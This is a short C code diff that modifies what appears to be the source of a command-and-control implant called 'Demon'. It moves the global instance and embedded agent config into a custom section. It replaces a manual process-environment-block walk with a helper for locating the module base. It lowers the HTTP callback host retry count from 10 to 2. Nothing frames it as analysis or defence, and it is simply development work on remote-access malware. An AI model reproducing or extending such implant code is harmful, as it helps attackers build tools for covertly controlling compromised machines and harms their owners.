@@ -17,8 +17,8 @@
 #include <Loader/ObjectApi.h>
 
 /* Global Variables */
-INSTANCE Instance      = { 0 };
-BYTE     AgentConfig[] = CONFIG_BYTES;
+SEC_DATA INSTANCE Instance      = { 0 };
+SEC_DATA BYTE     AgentConfig[] = CONFIG_BYTES;
 
 /*
  * In DemonMain it should go as followed:
@@ -784,7 +784,8 @@ VOID DemonInit( VOID )
     PUTS( "[!] NtQuerySystemInformation Failed" );
 
     if ( ! Instance.Session.ModuleBase )
-        Instance.Session.ModuleBase = ( ( PLDR_DATA_TABLE_ENTRY ) ( ( PPEB ) Instance.Teb->ProcessEnvironmentBlock )->Ldr->InMemoryOrderModuleList.Flink )->DllBase;
+        /* if we specified nothing as our ModuleBase then this either means that we are an exe or we should use the whole process */
+        Instance.Session.ModuleBase = LdrModulePeb( NULL );
 
     Instance.Session.OS_Arch     = SystemInfo.ProcessorArchitecture;
     Instance.Session.PID         = Instance.Teb->ClientId.UniqueProcess;
@@ -863,7 +864,7 @@ VOID DemonConfig()
 #ifdef TRANSPORT_HTTP
     Instance.Config.Transport.Method         = L"POST";
     Instance.Config.Transport.HostRotation   = ParserGetInt32( &Parser );
-    Instance.Config.Transport.HostMaxRetries = 10;  /* Max retries. */
+    Instance.Config.Transport.HostMaxRetries = 2;  /* Max retries. */
     Instance.Config.Transport.Hosts          = NULL;
     Instance.Config.Transport.Host           = NULL;
 
